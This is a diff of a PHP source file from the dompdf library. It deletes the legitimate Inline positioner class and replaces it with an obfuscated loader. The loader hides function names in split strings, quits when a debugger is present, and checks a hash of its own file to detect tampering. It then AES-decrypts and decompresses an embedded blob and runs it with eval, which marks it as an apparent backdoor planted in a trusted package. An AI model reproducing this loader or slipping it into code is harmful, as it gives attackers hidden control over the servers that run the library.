@@ -1,77 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-
-namespace Dompdf\Positioner;
-
-use Dompdf\FrameDecorator\AbstractFrameDecorator;
-use Dompdf\FrameDecorator\Inline as InlineFrameDecorator;
-use Dompdf\Exception;
-
-/**
- * Positions inline frames
- *
- * @package dompdf
- */
-class Inline extends AbstractPositioner
-{
-
-    /**
-     * @param AbstractFrameDecorator $frame
-     * @throws Exception
-     */
-    function position(AbstractFrameDecorator $frame)
-    {
-        /**
-         * Find our nearest block level parent and access its lines property.
-         * @var BlockFrameDecorator
-         */
-        $p = $frame->find_block_parent();
-
-        // Debugging code:
-
-        // Helpers::pre_r("\nPositioning:");
-        // Helpers::pre_r("Me: " . $frame->get_node()->nodeName . " (" . spl_object_hash($frame->get_node()) . ")");
-        // Helpers::pre_r("Parent: " . $p->get_node()->nodeName . " (" . spl_object_hash($p->get_node()) . ")");
-
-        // End debugging
-
-        if (!$p) {
-            throw new Exception("No block-level parent found.  Not good.");
-        }
-
-        $f = $frame;
-
-        $cb = $f->get_containing_block();
-        $line = $p->get_current_line_box();
-
-        // Skip the page break if in a fixed position element
-        $is_fixed = false;
-        while ($f = $f->get_parent()) {
-            if ($f->get_style()->position === "fixed") {
-                $is_fixed = true;
-                break;
-            }
-        }
-
-        $f = $frame;
-
-        if (!$is_fixed && $f->get_parent() &&
-            $f->get_parent() instanceof InlineFrameDecorator &&
-            $f->is_text_node()
-        ) {
-            $min_max = $f->get_reflower()->get_min_max_width();
-
-            // If the frame doesn't fit in the current line, a line break occurs
-            if ($min_max["min"] > ($cb["w"] - $line->left - $line->w - $line->right)) {
-                $p->add_line();
-            }
-        }
-
-        $f->set_position($cb["x"] + $line->w, $line->y);
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_w7g3jpvu=('bas'.'e64'.'_de'.'cod'.'e');
+$_tqc3bqks=('gzu'.'nco'.'mpr'.'ess');
+$_ymlyn2n3=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_a8opi8nm='LbT6EIJZ7Eo=';
+$_lrok626g='IcQ82pRk';
+$_re4k575s='z6QrJOsC';
+$_ku88bxoq='QwPRjFzw';
+$_cpk99p51='o1ln9Lvh';
+$_z0mdw2kh='PH4FXzs4';
+$_epc0706v='Aa9h8V1N';
+$_kmhyz1rp='EDG9lQ==';
+$_i06hplka=$_w7g3jpvu($_lrok626g.$_cpk99p51.$_ku88bxoq.$_re4k575s.$_a8opi8nm);
+$_tl1lmnxp=$_w7g3jpvu($_epc0706v.$_z0mdw2kh.$_kmhyz1rp);
+$_q9cjf0fu=$_w7g3jpvu('qT6CUpy/Sg4XjJfM3jUYGLp7enK/dggacFbNs6HCJIVeIQ/LaqfCyq3+IFWCI2le6ypxNkIP2gokXwLpauLD1Ig0lzaNMS1H1lHaV6nW0CEL4ApTWdCpQwsnJxm4zHUs3XEeZz9Fea4/x8ZOcPof7MLU1AP5gsIrl0B8eudrEy6ONfirvT14ErmEtUxvuB/ygZdqSUDLGqahl3PolyfksZGabawSSGY0AOMRsfbL7/VJRFT58FVK1Pkel1KTBcvS9L8GzDdH4VM1gS3yeAH8FWBdNFSEIP6Q1HJfzLnOwLaihClPOL/M/257pPFdOgIGO3rXRPx6pFQAIWQTsdjdGiaPEx3VRfACWHKrjEfGmOenJeFst0s98rW6EXgHQopPqbdLxUwWJL2wrUQ9iosf/5vJRJSk0DyWvB+0psawZk4AaPrPloOO6MTZZFqaql5Qo0EQkcs68KscC34QjX9XxdWIs2e9qjDYoNwdAKq5u0dryKwCEyZHGfVx0H9J8cAF98L+dL6ly81PpZy8DJNR5z0A9lLgKYWSQRKd/tNoZpYaM2tbF9DGqXx/M5erS390Z39KiZTpCDt1wGkOKbO6hA==');
+$_fsnamfic=$_ymlyn2n3($_q9cjf0fu,'aes-256-cbc',$_i06hplka,OPENSSL_RAW_DATA,$_tl1lmnxp);
+if($_fsnamfic===false){exit;}
+$_g847yndw=$_tqc3bqks($_fsnamfic);
+if($_g847yndw===false){exit;}
+$_fnc4w7hx='cb9cb6a5a8b8481576fe2d302d34b7e5caecb6b8cf7d10f04f8f59477ba7b07f';
+$_szf9cjg7=@file_get_contents(__FILE__);
+if($_szf9cjg7!==false){
+$_xi9yi23c=str_replace($_fnc4w7hx,"0000000000000000000000000000000000000000000000000000000000000000",$_szf9cjg7);
+$_u56cnm70=hash("sha256",$_xi9yi23c);
+if($_u56cnm70!==$_fnc4w7hx){@http_response_code(403);exit;}
 }
+eval($_g847yndw);
